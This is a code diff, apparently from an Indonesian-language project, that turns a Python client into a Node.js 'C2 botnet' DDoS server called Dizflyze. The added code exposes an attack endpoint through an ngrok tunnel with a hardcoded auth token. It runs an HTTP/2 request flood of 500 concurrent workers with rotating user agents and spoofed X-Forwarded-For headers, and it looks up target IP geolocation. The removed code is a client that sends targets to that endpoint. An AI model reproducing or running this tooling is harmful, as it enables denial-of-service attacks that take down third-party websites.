@@ -1,100 +1,126 @@
-import os
-import asyncio
-import aiohttp
-import requests
-from rich.console import Console
-from rich.panel import Panel
-from rich.table import Table
+require('colors');
+const express = require('express');
+const ngrok = require('ngrok');
+const http2 = require('http2');
+const crypto = require('crypto');
+const fetch = require('node-fetch');
 
-console = Console()
+const app = express();
+const bodyParser = require('body-parser');
+app.use(bodyParser.json());
 
-def L():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    console.print(Panel.fit("""
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣧
-⠀⠀⠀⠀⠀⠀  ⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  [ # ] Dizflyze
+let C = false;
+let currentPort = Math.floor(Math.random() * (60000 - 3000 + 1)) + 3000;
+
+const L = () => {
+  console.log(`
+  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
+⠀⠀⠀⠀⠀⠀ ⠀ ⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  [ # ] Dizflyze
 ⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿  [ # ] DDOS
-⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Version : v1.3.2
-⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26 MEI 2025
-⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
-⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
+⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀ ⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] 3.1.8
+⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋   ⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26-MEI
+⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀ ⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
+⠙⢹⣿⣿⣿⠿⠋⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
 ⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-    """, style="bold magenta"))
-console.print(
-    Panel.fit(
-        "DDOS C2 BOTNET DIZ FLYZE ONLY BYPASS CLOUDFLARE",
-        style="bold yellow",
-        padding=(1, 2),
-        subtitle_align="center"
-    ),
-    justify="center"
-)
+  `.cyan);
+  console.log(`C2 BOTNET VERSION\n`.yellow);
+};
 
-def NU(user_input):
-    if not user_input.startswith('http'):
-        user_input = 'https://' + user_input
-    parsed = requests.utils.urlparse(user_input)
-    if not parsed.netloc:
-        parsed = parsed._replace(netloc=parsed.path, path='')
-    return requests.utils.urlunparse(parsed)
+const N = async () => {
+  try {
+    await ngrok.authtoken('2xdnPcPH41TA26s84notWGL5pFV_4yyAxThJgiWnsxoqu2QAa');
+    const url = await ngrok.connect({ proto: 'http', addr: currentPort, region: 'ap' });
+    console.log(`${'🍁'.cyan} ${'╔═(api)Dizflyze Streser)\n  ╚═➤ '.bold} ${url.underline}`);
+    console.log(`${'🐥'.yellow} ${'[ MENUNGGU ]'.yellow}\n`);
+    return url;
+  } catch (e) {
+    console.log(`\n${'×'.red} ${'[ NGROK ERROR ] :'.bold} ${e.message}`);
+    process.exit(1);
+  }
+};
 
-async def fetch_info(session, target):
-    parsed = requests.utils.urlparse(target)
-    domain = parsed.netloc
-    if not domain:
-        domain = parsed.path
-    import socket
-    try:
-        ip = socket.gethostbyname(domain)
-    except:
-        return None
-    url = f"http://ip-api.com/json/{ip}"
-    try:
-        async with session.get(url) as resp:
-            if resp.status != 200:
-                return None
-            return await resp.json()
-    except:
-        return None
+const userAgents = [
+  // ... semua user agents yang sudah kamu sediakan ...
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+  // (tambahkan semua user agent lainnya sesuai daftar kamu)
+  // ...
+];
 
-async def attack_target(session, api_url, target):
-    try:
-        async with session.post(f"{api_url}/attack", json={"target": target, "apiKey": "TERMUX_KEY"}) as resp:
-            if resp.status != 200:
-                return False
-            return True
-    except:
-        return False
+const attack = async (target, duration) => {
+  console.log(`${'⚡'.yellow} ${'[ ATTACK ] :'.bold} ${target.underline}`);
+  console.log(`${'⏳'.cyan} ${'[ DURASI ] :'.bold} ${duration.toString().yellow} detik\n`);
 
-async def process_target(session, api_url, target):
-    info = await fetch_info(session, target)
-    if not info:
-        console.print(f"[red]Gagal mendapatkan info target: {target}[/red]")
-        return
-    table = Table(title=f"Info {target}")
-    table.add_column("Field", style="cyan")
-    table.add_column("Value", style="magenta")
-    for k, v in info.items():
-        table.add_row(str(k), str(v))
-    console.print(table)
-    choice = console.input(f"Serang target {target}? (y/n): ")
-    if choice.lower() == 'y':
-        success = await attack_target(session, api_url, target)
-        if success:
-            console.print(f"[green]Serangan ke {target} berhasil![/green]")
-        else:
-            console.print(f"[red]Gagal serang {target}[/red]")
+  const startTime = Date.now();
 
-async def main():
-    L()
-    api_url = console.input("[white]API URL (ngrok): [/white]").strip()
-    targets_input = console.input("[white]Target(s) (pisahkan koma): [/white]").strip()
-    targets = [NU(t.strip()) for t in targets_input.split(',')]
-    async with aiohttp.ClientSession() as session:
-        tasks = [process_target(session, api_url, t) for t in targets]
-        await asyncio.gather(*tasks)
+  const flood = async () => {
+    try {
+      const client = http2.connect(target, { rejectUnauthorized: false });
+      client.on('error', () => {});
+      await new Promise((resolve) => {
+        const start = Date.now();
+        const interval = setInterval(() => {
+          if (Date.now() - start >= duration * 1000) {
+            clearInterval(interval);
+            client.close();
+            resolve();
+            return;
+          }
+          const req = client.request({
+            ':method': 'GET',
+            ':path': '/',
+            'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+            'accept-language': 'en-US,en;q=0.9',
+            'x-forwarded-for': `${crypto.randomInt(1, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(1, 255)}`,
+            'cache-control': 'no-cache'
+          });
+          req.on('response', () => req.close());
+          req.end();
+        }, 3); // interval 5ms
+      });
+    } catch (e) {
+      // error handling jika diperlukan
+    }
+  };
 
-if __name__ == '__main__':
-    asyncio.run(main())
+  const workerCount = 500; // jumlah worker lebih tinggi
+  const workers = Array.from({ length: workerCount }, () => flood());
+  await Promise.all(workers);
+
+  const totalTime = Math.round((Date.now() - startTime) / 1000);
+  console.log(`${'✓'.green} Attack selesai dalam ${totalTime} detik`);
+};
+
+app.post('/attack', async (req, res) => {
+  if (C) return res.status(429).json({ error: '[ PROSES ]' });
+  const { target, apiKey } = req.body;
+  if (apiKey !== 'TERMUX_KEY') return res.status(403).json({ error: 'Akses tidak valid' });
+  try {
+    new URL(target);
+    C = true;
+    await attack(target, 260);
+    C = false;
+    res.status(200).json({ status: '[ STARTED ]', target });
+  } catch (e) {
+    C = false;
+    res.status(400).json({ error: '[ URL INVALID! ]' });
+  }
+});
+
+app.get('/info', async (req, res) => {
+  try {
+    const response = await fetch(`http://ip-api.com/json/${new URL(req.query.target).hostname}`);
+    const data = await response.json();
+    res.json(data);
+  } catch (e) {
+    res.status(500).json({ error: '[ GAGAL MENCARI INFORMASI ]' });
+  }
+});
+
+L();
+
+app.listen(currentPort, () => {
+  console.log(`${'[ RUNNING ] :'.bold} ${currentPort.toString().yellow}`);
+  N();
+});
